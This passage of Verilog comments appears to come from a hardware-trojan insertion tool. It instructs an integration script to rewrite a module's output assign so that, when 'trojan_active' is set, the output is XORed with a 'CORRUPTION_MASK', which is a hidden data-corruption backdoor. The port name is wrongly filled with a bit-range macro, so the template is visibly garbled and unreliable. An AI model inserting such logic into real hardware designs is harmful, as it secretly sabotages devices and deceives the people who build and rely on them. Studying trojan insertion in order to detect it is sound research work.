...
//
// IMPORTANT: `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 (or first output assign):
//     assign `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 = <expr>;
//   Replace with:
//     assign `PS_PL_CTRL_QUEUE_DATA_BIT_SIZE-1:0 = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
